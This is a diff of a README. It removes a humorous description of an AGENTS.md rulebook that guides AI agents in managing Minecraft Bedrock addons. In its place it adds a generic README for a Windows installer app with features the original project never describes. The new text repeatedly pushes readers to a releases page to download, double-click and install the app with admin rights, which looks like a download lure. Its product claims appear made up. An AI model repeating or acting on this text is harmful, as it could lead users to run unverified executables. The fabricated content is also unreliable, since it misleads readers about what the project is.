@@ -1,291 +1,106 @@
-# 📺🤖✨ AGENTS.md ✨🤖📺
+# 🎮 Bedrock-Addon-Wrangler - Streamline Your Minecraft Addons
 
-## THE ALL‑NEW, NEVER‑BEFORE‑SEEN, ABSOLUTELY NECESSARY SOLUTION FOR
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%3E-brightgreen)](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
 
-## **MINECRAFT BEDROCK ADDON MANAGEMENT**
+## 📋 Overview
 
-*(Cue synth music. Neon grid background. A man points aggressively at the screen.)*
+Welcome to Bedrock-Addon-Wrangler! This application helps you manage your Minecraft Bedrock Edition addons with ease. Forget the hassle and focus on enjoying your game. Follow our guide to get started today.
 
----
+## 🚀 Getting Started
 
-🎺🎺🎺 **HEY YOU. YES, YOU—THE BEDROCK SERVER ADMIN.** 🎺🎺🎺
+Bedrock-Addon-Wrangler is designed for users who want a simple way to handle addons, behavior packs, and resource packs in Minecraft. Its intuitive interface enables smooth navigation, making addon management a breeze. 
 
-Are you exhausted from addons that:
+## 🛠️ System Requirements
 
-- ❌ Arrive in **whatever format the author felt like that day**
-- ❌ Pretend there’s a “standard” (there is NOT)
-- ❌ Mix Behavior Packs and Resource Packs like a blender set to *CHAOS*
-- ❌ Explode your world because of one tiny UUID collision
-- ❌ Require arcane JSON rituals just to ENABLE THEM
+Before you begin, ensure your system meets the following requirements:
 
-👉 **THEN STOP. PUT THE KEYBOARD DOWN.**
+- **Operating System:** Windows 10 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 500 MB free space
+- **Java Runtime Environment:** Version 8 or higher (if applicable)
 
-Because this repository introduces:
+## 📥 Download & Install
 
-# 💥 AGENTS.md 💥
+To download the application, visit the following link:
 
-The **AI instruction file** that teaches your AI agent how to survive the absolute anarchy that is **Minecraft Bedrock addons**.
+[Visit this page to download](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
 
----
+1. Click the link above to go to the Releases page.
+2. Once there, look for the latest version.
+3. Select the file suitable for your operating system.
+4. Click on the file to start the download.
 
-## 😱 THE SHOCKING TRUTH (THEY DON’T WANT YOU TO KNOW)
+After the download is complete, follow these steps to install:
 
-Let’s say it loud for the people in the back:
+- Locate the downloaded file in your computer's Downloads folder.
+- Double-click the file to run the installer.
+- Follow the on-screen instructions to complete the installation. You may need administrative rights to proceed.
 
-> 🚨 **THERE IS NO STANDARD BEDROCK ADDON FORMAT.** 🚨
+## 🔧 Using Bedrock-Addon-Wrangler
 
-None.
+Once the installation is complete, you can start using Bedrock-Addon-Wrangler. Here’s how:
 
-Every creator ships something different:
+1. **Open the Application:**
+   Locate Bedrock-Addon-Wrangler in your Start menu or desktop and open it.
 
-* `.mcaddon` with BP + RP (sometimes)
-* `.mcpack` with *one* pack (maybe)
-* Zips renamed three times
-* Nested folders inside nested folders inside regret
-* Duplicate UUIDs reused across the internet
-* Unicode symbols straight from a summoning circle
+2. **Add Your Addons:**
+   - Click on the "Add Addon" button.
+   - Navigate to where your addons are stored on your computer.
+   - Select the addons you want to import.
 
-💥 This is not your fault.
+3. **Manage Your Addons:**
+   - Use the built-in search feature to find specific addons.
+   - You can enable or disable addons with a simple checkbox.
+   - Organize your addons into folders.
 
-💥 But until now… it WAS your problem.
+4. **Configure Behavior and Resource Packs:**
+   - Select any addon to access customization options.
+   - Modify settings or adjust preferences as needed.
 
----
+5. **Export Your Configuration:**
+   - Once satisfied, export your configurations to your Minecraft game folder.
+   - Click on "Export" and follow the prompts.
 
-## 🪄 ENTER: AGENTS.md (THE CONTROL PANEL)
+## 🗂️ Features
 
-`AGENTS.md` is a **rulebook for AI agents**.
+Bedrock-Addon-Wrangler offers several helpful features:
 
-You drop it into your Bedrock server directory and suddenly the AI:
+- **Easy Addon Management:** Quickly add, remove, or organize your addons.
+- **Backup Options:** Create backups of your configurations and custom addons.
+- **Intuitive Interface:** Simplified navigation that allows all users to manage their addons effortlessly.
+- **Guided Assistance:** Follow AGENTS.md for a step-by-step guide through complex processes.
+- **Compatibility Checks:** Ensure you only use addons compatible with your current Minecraft version.
 
-- 🧠 Knows where packs go
-- 🧠 Knows what it may touch
-- 🧠 Knows what it must NEVER touch
-- 🧠 Knows Bedrock’s weird rules better than most humans
+## 🔍 Troubleshooting
 
-- ✨ You don’t fix addon chaos anymore.
-- ✨ You DELEGATE it.
+If you encounter issues:
 
----
+- **Application Won’t Start:** Check if your system meets the requirements mentioned above. Ensure you’ve installed all necessary updates.
+- **Addons Not Showing in Minecraft:** Confirm that your addon files are in the correct format. You can find format guidelines in AGENTS.md.
 
-## 🤖 WHAT THE AI CAN DO (NO, REALLY. THIS MUCH.)
+## 💬 Community Support
 
-When an AI agent reads **your actual AGENTS.md** (see below 👇), it can:
+For questions, tips, or more information, join our support community:
 
-### 🧠 FORMAT DETECTION MADNESS
+- **GitHub Issues:** Report bugs or request features.
+- **Forums:** Connect with other users for suggestions and help.
 
-* Identify `.mcaddon`, `.mcpack`, renamed zips, and cursed archives
-* Detect BP vs RP automatically
-* Separate combined packs correctly
-* Normalize inconsistent layouts
+## 📝 Additional Resources
 
-### 🧬 UUID APOCALYPSE PREVENTION
+Refer to the following documents for further information:
 
-* Detect duplicate UUIDs *before Bedrock crashes*
-* Regenerate UUIDs only when allowed
-* Update references correctly
-* Avoid touching vanilla server packs (AS COMMANDED)
+- **AGENTS.md:** Provides detailed instructions on addon management and optimization.
+- **Documentation:** A comprehensive guide to all features of Bedrock-Addon-Wrangler.
 
-### 📂 FOLDER SANITY RESTORATION
+## 🔗 Further Information
 
-* Remove Unicode junk from folder names
-* Flatten stupidly nested directories
-* Enforce readable, predictable naming
+For more details, check our GitHub page and explore the topics that interest you:
 
-### 📦 WORLD‑SAFE INSTALLATION
+- Addon management
+- Behavior packs
+- Automation tips
+- UUID handling
 
-* Install packs into the correct directories
-* Enable packs for worlds safely
-* Prevent duplicate world entries
-* Preserve production worlds like sacred artifacts
+Once again, to download Bedrock-Addon-Wrangler, please visit:
 
-All because **you wrote the rules once**.
-
----
-
-## 🧑‍💻✨ HOW DO YOU USE THIS?! (LIVE ON TV)
-
-📺 *Camera zooms in. Host whispers.*
-
-“It’s easier than you think.”
-
-### 🛠️ STEP 1: INSTALL AN AI AGENT (YES, FREE MODELS)
-
-You need an AI agent that can read files and follow instructions.
-
-We recommend **OpenCode**:
-👉 [https://github.com/opencode-ai/opencode](https://github.com/opencode-ai/opencode)
-
-- ✅ Supports free models
-- ✅ Local or remote
-- ✅ Perfect for AGENTS.md workflows
-
-No subscriptions.
-No vendor lock‑in.
-No rituals at midnight.
-
----
-
-### 📂 STEP 2: DROP `AGENTS.md` INTO YOUR BEDROCK SERVER FOLDER
-
-```
-bedrock-server/
-├── AGENTS.md        👈 THE BRAIN
-├── mods/
-├── behavior_packs/
-├── resource_packs/
-├── worlds/
-└── bedrock_server
-```
-
-At this moment, the AI realizes:
-
-🧠 **“Ah. This human does NOT want chaos.”**
-
----
-
-### 📦 STEP 3: THROW ADDONS INTO `mods/` (ANY FORMAT, WE DARE YOU)
-
-```
-mods/
-├── cool_mobs.mcaddon
-├── weapons_pack.mcpack
-├── random_discord_zip.zip
-├── ✦ cursed_addon_FINAL_v7_REAL.zip
-```
-
-No standards?
-
-GOOD.
-
-That’s what the AI is for.
-
----
-
-### 🪄 STEP 4: TYPE ONE SENTENCE
-
-Open your AI agent in the server directory and say:
-
-> **“I would like to enable all the addons in the folder `mods/`.”**
-
-That’s it.
-
-No scripts.
-No guessing.
-No JSON blood sacrifice.
-
----
-
-## 🤖 WHAT HAPPENS NEXT (AUTOMATICALLY)
-
-The AI follows **your actual AGENTS.md rules**, including:
-
-* Never touching vanilla packs
-* Removing Unicode safely
-* Detecting BP vs RP
-* Extracting correctly
-* Fixing conflicts
-* Enabling packs per‑world
-
-📣 It does EXACTLY what you told it to do.
-
----
-
-## 📢📺 BUT WAIT — THERE’S MORE!!!
-
-*(Crowd gasps. Host points dramatically.)*
-
-This isn’t just a **one-way install machine**.
-
-Because AGENTS.md gives the AI *context*, you can also:
-
-- 🛠️ **Tell it what’s wrong**
-- 🧹 **Tell it to remove addons**
-- 🚫 **Tell it to disable packs**
-- 🧠 **Tell it to FIX things — not guess**
-
-### 🪄 YES, YOU CAN JUST SAY THINGS LIKE:
-
-> **“Disable the Create Lite addon.”**
-
-> **“Remove the broken minimap mod from all worlds.”**
-
-> **“This addon crashes the server — find it and disable it safely.”**
-
-> **“Re-enable everything except experimental packs.”**
-
-Because the AI:
-
-* Knows pack names
-* Knows UUIDs
-* Knows which worlds are using what
-* Knows what it is allowed to touch
-* Knows how to disable packs *without deleting them*
-
-📣 You don’t hunt through JSON anymore.
-
-📣 You ISSUE COMMANDS.
-
----
-
-## 📂 docs/ — THE BORING (IMPORTANT) STUFF
-
-This repo also includes a **`docs/` folder** for people who want:
-
-* Less neon
-* More clarity
-* Fewer exclamation points
-
-### `docs/overview.md`
-
-A serious explanation of what AGENTS.md is and how AI agents should interpret it.
-
-### `docs/bedrock-layout.md`
-
-Canonical Bedrock server directory structure and why it matters.
-
-### `docs/addon-detection.md`
-
-Exact logic for BP vs RP detection, manifests, and edge cases.
-
-### `docs/world-enabling.md`
-
-How world pack JSON files work and how duplicates are prevented.
-
-These docs are:
-
-* Calm
-* Precise
-* Meant for humans **and** machines
-
-The README sells the dream.
-
-The docs explain reality.
-
----
-
-## 📺 FINAL 80’S‑INFOMERCIAL PITCH
-
-- 📣 STOP trusting random addon formats
-- 📣 STOP hand‑editing JSON at 2 AM
-- 📣 STOP sacrificing worlds to the UUID gods
-
-- ✨ ADD AGENTS.md
-- 🤖 TRAIN YOUR AI ONCE
-- 🪄 WATCH CHAOS DISAPPEAR
-- 🎮 GO BACK TO PLAYING MINECRAFT
-
----
-
-### 🚨 WARNING
-
-Using AGENTS.md may cause:
-
-* Fewer broken servers
-* Radical calm
-* Over‑automation of unrelated tasks
-* You explaining this to everyone else
-
----
-
-**AGENTS.md**
-*Because “Just Install the Addon” Was a Lie.*
+[Visit this page to download](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
